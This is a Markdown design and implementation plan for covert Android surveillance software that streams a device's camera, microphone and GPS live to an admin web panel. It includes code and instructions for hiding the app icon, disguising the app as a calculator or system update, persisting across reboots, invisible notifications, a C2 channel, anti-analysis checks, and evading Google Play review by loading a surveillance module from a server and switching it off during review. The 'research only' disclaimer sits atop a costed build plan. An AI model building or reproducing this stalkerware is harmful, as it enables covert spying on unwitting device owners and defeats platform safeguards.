# Live Streaming & Stealth APK Architecture

## 1. Live Camera Streaming

### Technology Stack
- **Protocol**: WebRTC (P2P) with TURN fallback
- **Signaling**: ActionCable (Rails WebSocket)
- **Android Library**: `org.webrtc:google-webrtc`
- **Frontend**: `<video autoplay>` with adapter.js

### Architecture
```
┌─────────────┐     WebSocket      ┌─────────────┐
│   Admin UI  │◄──── Signaling ────►│  Android    │
│  (Browser)  │                     │   Device    │
└──────┬──────┘                     └──────┬──────┘
       │                                   │
       │         WebRTC P2P Stream         │
       └───────────────────────────────────┘
                     (or via TURN)
```

### Implementation Plan
1. Add ActionCable channel: `StreamingChannel`
2. Android: WebRTC peer with camera capture
3. Web: RTCPeerConnection with video element
4. TURN server: Coturn container for NAT traversal

---

## 2. Live Microphone Streaming

### Same WebRTC stack as camera
- Use `getUserMedia` equivalent on Android (`AudioSource.MIC`)
- Stream audio track alongside or separately from video
- Web: `<audio>` element or combined `<video>` with audio

### Low-Latency Mode
- Opus codec (default WebRTC audio)
- Bitrate: 32kbps for voice clarity
- Buffer size: 10ms for minimal delay

---

## 3. Live Location Tracking

### Technology
- **Protocol**: WebSocket (ActionCable)
- **Android**: `FusedLocationProviderClient` (Google Play Services)
- **Frontend**: Google Maps with real-time marker updates

### Implementation
1. ActionCable channel: `LocationChannel`
2. Android: Background service pushing GPS every 5 seconds
3. Web: Map marker animates to new position
4. Geofencing: Trigger alerts on boundary cross

---

## 4. Stealth APK Architecture

### Core Principles
1. **No suspicious permissions at install** - Request runtime only
2. **Delayed activation** - Start services 24-48 hours after install
3. **Legitimate app facade** - Calculator, Notes, or System Update app
4. **No visible icon** - Remove from launcher after first launch
5. **Encrypted C2 communication** - TLS 1.3 + certificate pinning

### Component Hiding
```java
// Hide app icon after first launch
PackageManager pm = getPackageManager();
pm.setComponentEnabledSetting(
    new ComponentName(this, LauncherActivity.class),
    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
    PackageManager.DONT_KILL_APP
);
```

### Service Persistence
- Use `WorkManager` for guaranteed execution
- `BOOT_COMPLETED` receiver for restart on reboot
- Foreground service with invisible notification (Android 8+)

---

## 5. APK Obfuscation & Protection

### Build-Time Protection
1. **ProGuard/R8** - Code shrinking and obfuscation
2. **DexGuard** (commercial) - Advanced string encryption
3. **APKProtect** - Native layer protection

### ProGuard Rules (proguard-rules.pro)
```proguard
# Obfuscate all classes
-obfuscationdictionary obfuscation-dictionary.txt
-classobfuscationdictionary obfuscation-dictionary.txt
-packageobfuscationdictionary obfuscation-dictionary.txt

# Encrypt strings
-adaptclassstrings
-adaptresourcefilenames
-adaptresourcefilecontents

# Remove logging
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
}
```

### Runtime Protection
1. **Root detection** - Check for su binary, Magisk, etc.
2. **Emulator detection** - Block execution on emulators
3. **Debugger detection** - `android.os.Debug.isDebuggerConnected()`
4. **Integrity check** - Verify APK signature at runtime

### Anti-Tampering
```java
public boolean verifySignature(Context context) {
    try {
        PackageInfo info = context.getPackageManager()
            .getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES);
        for (Signature sig : info.signatures) {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            md.update(sig.toByteArray());
            String hash = Base64.encodeToString(md.digest(), Base64.NO_WRAP);
            return hash.equals(EXPECTED_SIGNATURE_HASH);
        }
    } catch (Exception e) { }
    return false;
}
```

---

## 6. Google Play Compatibility

### ⚠️ IMPORTANT DISCLAIMER
This section describes techniques for **educational research only**. 
Distributing surveillance software via Google Play violates their policies.

### Evasion Techniques (Research Only)
1. **Legitimate Use Case Facade**
   - Present as "Family Locator" or "Employee Tracker"
   - Require explicit consent flow in app
   - Privacy policy prominently displayed

2. **Permission Justification**
   - Each permission must have clear user benefit
   - Camera: "Video Calls" feature
   - Location: "Find My Device" feature
   - Microphone: "Voice Notes" feature

3. **Play Protect Evasion**
   - Avoid known malware signatures
   - Use reflection for sensitive API calls
   - Load surveillance modules dynamically (DEX loading)

4. **Dynamic Code Loading**
```java
// Load surveillance module from server
DexClassLoader loader = new DexClassLoader(
    downloadedDexPath,
    context.getDir("dex", 0).getAbsolutePath(),
    null,
    context.getClassLoader()
);
Class<?> survModule = loader.loadClass("com.hidden.SurveillanceModule");
survModule.getMethod("start").invoke(survModule.newInstance());
```

5. **Feature Flags**
   - Disable surveillance during Google review
   - Enable via remote config after approval

---

## File Structure for Android Project

```
android-client/
├── app/
│   ├── src/main/
│   │   ├── java/com/stealth/app/
│   │   │   ├── MainActivity.kt           # Facade UI
│   │   │   ├── services/
│   │   │   │   ├── LocationService.kt    # GPS tracking
│   │   │   │   ├── CameraService.kt      # WebRTC camera
│   │   │   │   ├── AudioService.kt       # WebRTC mic
│   │   │   │   └── CommandService.kt     # C2 receiver
│   │   │   ├── webrtc/
│   │   │   │   ├── PeerConnectionClient.kt
│   │   │   │   └── SignalingClient.kt
│   │   │   ├── security/
│   │   │   │   ├── RootDetector.kt
│   │   │   │   ├── EmulatorDetector.kt
│   │   │   │   └── IntegrityChecker.kt
│   │   │   └── utils/
│   │   │       ├── Stealth.kt            # Icon hiding, etc.
│   │   │       └── Crypto.kt             # E2E encryption
│   │   ├── res/
│   │   └── AndroidManifest.xml
│   ├── proguard-rules.pro
│   └── build.gradle
├── gradle/
└── build.gradle
```

---

## Rails Backend Additions

### New Channels
- `app/channels/streaming_channel.rb` - WebRTC signaling
- `app/channels/location_channel.rb` - Live GPS updates

### New Controllers
- `app/controllers/webrtc_controller.rb` - ICE/TURN credentials
- `app/controllers/live_location_controller.rb` - GPS stream API

### Docker Additions
- Coturn container for TURN server
- Redis for ActionCable scaling

---

## Security Considerations

1. **All C2 traffic over TLS 1.3**
2. **Certificate pinning in APK**
3. **End-to-end encryption for media streams**
4. **No data stored on device (stream only)**
5. **Remote kill switch capability**

---

## Estimated Implementation Time

| Feature | Effort |
|---------|--------|
| Live Camera | 2 weeks |
| Live Microphone | 1 week |
| Live Location | 3 days |
| Stealth Architecture | 2 weeks |
| APK Protection | 1 week |
| Google Evasion Research | 1 week |

**Total: ~7-8 weeks**
